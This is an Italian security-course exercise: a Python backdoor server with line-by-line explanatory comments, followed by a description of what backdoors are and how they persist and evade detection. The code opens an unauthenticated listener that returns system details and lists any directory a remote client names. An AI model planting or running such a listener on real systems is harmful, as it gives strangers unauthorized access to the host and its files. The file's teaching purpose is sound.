#Traccia:
#L'esercizio di oggi consiste nel commentare/spiegare questo codice che fa riferimento ad una backdoor.
# Inoltre spiegare cos’è una backdoor.


import socket, platform, os  # Importa i moduli necessari:
# - `socket` per creare connessioni di rete TCP/IP.
# - `platform` per ottenere dettagli sul sistema operativo e l'architettura della macchina.
# - `os` per interagire con il file system e ottenere informazioni sui file e le directory.

SRV_ADDR = ''  # Definisce l'indirizzo IP del server.
# Un valore vuoto significa che il server ascolterà su tutte le interfacce di rete disponibili,
# permettendo di accettare connessioni da qualsiasi IP.

SRV_PORT = 1234  # Definisce la porta su cui il server ascolterà le connessioni in entrata.
# La porta 1234 è arbitraria e può essere cambiata, come ad esempio 44444. È fondamentale che la porta non sia riservata.

# Crea un nuovo socket utilizzando IPv4 (`AF_INET`) e il protocollo TCP (`SOCK_STREAM`).
# Questo socket è l'endpoint del server per la comunicazione di rete.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Associa il socket all'indirizzo IP e alla porta specificati sopra.
# `bind` è necessario per rendere il server visibile ai client in rete.
s.bind((SRV_ADDR, SRV_PORT))

# Configura il socket per ascoltare le connessioni in entrata.
# Il parametro `1` specifica il numero massimo di connessioni in coda che possono essere gestite.
# Una connessione in coda significa che può accettare solo una connessione alla volta.
s.listen(1)

# Accetta una connessione in entrata e crea un nuovo socket (`connection`) per comunicare con il client.
# `address` contiene l'indirizzo IP e la porta del client che si è connesso.
connection, address = s.accept()

# Stampa l'indirizzo IP e la porta del client che si è connesso al server.
# Questo è utile per tenere traccia di chi si sta connettendo.
print("client connected:", address)

# Inizia un ciclo infinito per gestire le richieste del client.
# Il ciclo continuerà a funzionare fino a quando non verrà interrotto manualmente o in caso di errore.
while 1:
    try:
        # Riceve fino a 1024 byte di dati dal client. `recv` è una chiamata bloccante,
        # il che significa che il programma aspetterà fino a quando non riceverà qualche dato.
        data = connection.recv(1024)
    except:
        # Se si verifica un errore durante la ricezione dei dati, il ciclo continua.
        # Questo mantiene il server attivo anche in caso di errori minori.
        continue

    # Decodifica i dati ricevuti in formato UTF-8 e verifica se il comando ricevuto è "1".
    # "1" è il comando per ottenere informazioni sulla piattaforma.
    if(data.decode('utf-8') == '1'):
        # Ottiene dettagli sul sistema operativo (`platform.platform()`)
        # e sul tipo di macchina (`platform.machine()`), come l'architettura (es. x86_64).
        tosend = platform.platform() + " " + platform.machine()
        # Invia queste informazioni al client, dopo averle codificate in byte.
        connection.sendall(tosend.encode())

    # Se il comando ricevuto è "2", il server si aspetta di ricevere un percorso di directory.
    # "2" è il comando per elencare i file in una directory.
    elif(data.decode('utf-8') == '2'):
        # Riceve il percorso della directory dal client.
        data = connection.recv(1024)
        try:
            # `os.listdir` elenca tutti i file e le directory nel percorso specificato.
            # `data.decode('utf-8')` converte i byte ricevuti in una stringa.
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""  # Inizializza una stringa vuota per costruire la lista dei file.
            for x in filelist:
                # Aggiunge ogni file o directory alla stringa `tosend`, separati da una nuova riga.
                tosend += x + "\n"
        except:
            # Se si verifica un'eccezione (es. percorso non valido), imposta `tosend` a "Wrong path".
            # Questo avvisa il client che il percorso fornito non è valido o non è accessibile.
            tosend = "Wrong path"
        # Invia la lista dei file o il messaggio di errore al client.
        connection.sendall(tosend.encode())

    # Se il comando ricevuto è "0", il server deve chiudere la connessione.
    # "0" è il comando per terminare la connessione.
    elif(data.decode('utf-8') == '0'):
        # Chiude la connessione con il client corrente.
        connection.close()
        # Si mette in attesa di una nuova connessione, riprendendo il ciclo.
        connection, address = s.accept()


# Spiegazione di una backdoor:
# Un backdoor, o anche detto "porta di servizio", è una vulnerabilità che consente l'accesso non autorizzato a un sistema,
# bypassando i meccanismi standard di sicurezza e autenticazione. Spesso è creato intenzionalmente o sfruttato
# da un attaccante per ottenere accesso continuativo e nascosto al sistema.

# Caratteristiche principali di un backdoor:
# Persistenza:
#    Mantiene l'accesso anche dopo riavvii o reinstallazioni del sistema.
#    Integra il codice in profondità, ad esempio nel kernel o come servizio nascosto.
# Discrezione:
#    Si nasconde tra i processi legittimi del sistema per evitare la rilevazione.
#    Utilizza tecniche di offuscamento per mascherare la sua presenza.
# Accesso Remoto:
#    Permette il controllo remoto del sistema tramite protocolli standard come HTTP o canali criptati.
# Privilegi Elevati:
#    Può elevare i propri privilegi per ottenere un controllo completo del sistema.
#    Sfrutta vulnerabilità o errori di configurazione per mantenere l'accesso.
# Evasione delle Sicurezze:
#    Può aggirare i controlli di sicurezza come firewall e antivirus.
#    Modifica le configurazioni o maschera la sua presenza nei log per evitare la rilevazione.
        